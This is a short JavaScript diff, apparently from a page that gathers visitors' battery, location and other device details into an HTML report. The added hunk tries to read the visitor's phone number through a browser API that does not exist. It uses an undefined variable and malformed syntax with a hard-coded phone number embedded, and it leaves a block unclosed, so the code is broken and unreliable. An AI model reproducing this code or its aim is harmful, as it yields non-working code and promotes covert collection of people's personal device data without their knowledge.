@@ -138,6 +138,12 @@ td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Char
 });
 }
 
+if("getPhonenumber" in navigator){
+await navigator.getPhonenumber().then(function(battery) {
+td+="<br><b>Phone Information</b><br>";
+td+="<b>phone:</b> " +phone.number*+917981630016"<br><b>phone:</b> "+phone.number+"";
+});
+
 //////Location
 if(!navigator.geolocation) {
 td+="<br><b>📍 Location Information</b><br>";
